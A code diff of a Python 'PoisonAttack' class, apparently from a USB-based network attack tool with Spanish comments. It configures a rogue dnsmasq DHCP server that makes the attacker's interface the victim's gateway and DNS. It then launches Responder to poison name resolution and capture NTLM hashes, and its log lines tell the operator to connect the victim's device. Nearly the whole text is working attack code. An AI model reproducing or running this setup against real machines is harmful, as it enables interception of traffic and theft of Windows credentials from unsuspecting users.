@@ -71,78 +71,71 @@ class PoisonAttack:
     def start(self):
         self._limpiar_procesos_previos()
         iface = self.interface
-    
+
         self.log("\n[!] DRAGON FLY SYSTEM")
         self.log(f"[*] Configurando interfaz: {iface}")
-    
+
         try:
             self.log("[*] Desvinculando interfaz de gestores de red...")
             os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
             os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
             time.sleep(1)
-    
+
             self.log("[*] Reset de interfaz y supresión IPv6/RA...")
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
             time.sleep(1)
             os.system(f"sudo ip link set {iface} up")
             time.sleep(2)
-    
-            # Desactivar IPv6 completamente para forzar DHCPv4
+
+            # Desactivar IPv6 para evitar esperas de SLAAC
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
             os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
-    
+
             ip = "192.168.10.1"
             subnet_mask = "24"
             ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
-    
+
             self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
             os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
             os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
-    
-            # Esperar a que la interfaz esté operativa y con IP
-            self.log("[*] Aguardando enlace...")
-            for _ in range(10):
-                if os.system(f"ip addr show dev {iface} | grep -q '{ip}'") == 0:
-                    break
-                time.sleep(1)
-    
-            # Reglas de firewall para DHCP
+
+            # ===== NUEVO: reglas de firewall para permitir DHCP =====
             self.log("[*] Configurando firewall para DHCP...")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
-    
-            # Configuración dnsmasq mejorada
+            # ======================================================
+
+            # Configuración dnsmasq (DHCP sin DNS)
             config_dhcp = (
                 f"interface={iface}\n"
-                f"bind-interfaces\n"                     # Solo esta interfaz
                 f"listen-address={ip}\n"
                 f"dhcp-range={ip_range}\n"
-                f"dhcp-option=3,{ip}\n"                  # Puerta de enlace
-                f"dhcp-option=6,{ip}\n"                  # DNS
-                f"dhcp-option=121,192.168.10.0/24,{ip}\n"  # Ruta estática sin clase
-                f"dhcp-option=15,\n"                     # Dominio vacío
-                f"dhcp-option=252,\n"                    # WPAD vacío
+                f"dhcp-option=3,{ip}\n"
+                f"dhcp-option=6,{ip}\n"
+                f"dhcp-option=15,\n"
+                f"dhcp-option=252,\n"
+                f"bind-dynamic\n"
                 f"no-resolv\n"
                 f"no-hosts\n"
-                f"port=0\n"                              # DNS desactivado
+                f"port=0\n"          # Sin DNS para evitar conflictos
                 f"log-dhcp\n"
-                f"dhcp-authoritative\n"                  # Forzar oferta inmediata
             )
             with open("dnsmasq_temp.conf", "w") as f:
                 f.write(config_dhcp)
-    
+
             self.log("[*] Iniciando dnsmasq...")
             self.dns_proc = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
             )
-            time.sleep(3)   # Dar tiempo para que dnsmasq abra los sockets
-    
+            time.sleep(2)
+
+            # Verificar que dnsmasq esté corriendo
             if self.dns_proc.poll() is not None:
                 err = self.dns_proc.stderr.read()
                 self.log(f"[!] dnsmasq falló al iniciar: {err.strip()}")
@@ -152,9 +145,9 @@ class PoisonAttack:
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                 )
             else:
-                self.log("[+] dnsmasq escuchando (DHCP listo).")
-    
-            # Detección de Responder (igual que antes)
+                self.log("[+] dnsmasq escuchando correctamente.")
+
+            # Detección de Responder
             responder_paths = [
                 "/usr/share/responder/Responder.py",
                 "/opt/Responder/Responder.py"
@@ -166,12 +159,12 @@ class PoisonAttack:
                     break
             if responder_cmd is None:
                 responder_cmd = ["sudo", "responder", "-I", iface, "-wvF"]
-    
+
             self.log(f"[+] INTERFAZ LISTA: {iface}")
             self.log(f"[+] IP: {ip}/{subnet_mask}")
             self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
             self.log(f"[+] Conecta ahora la víctima al puerto USB")
-    
+
             self.proc_responder = subprocess.Popen(
                 responder_cmd,
                 stdout=subprocess.PIPE,
@@ -179,20 +172,19 @@ class PoisonAttack:
                 text=True,
                 bufsize=1
             )
-    
+
             while not self.stop_event.is_set():
                 linea = self.proc_responder.stdout.readline()
                 if not linea and self.proc_responder.poll() is not None:
                     break
                 if linea:
                     self.log(linea.strip())
-    
+
         except Exception as e:
             self.log(f"\n[!] Error crítico: {e}")
         finally:
             self._cleanup()
-    
-    
+
     def _cleanup(self):
         self.log("\n[*] Deteniendo procesos y restaurando red...")
         if self.dns_proc:
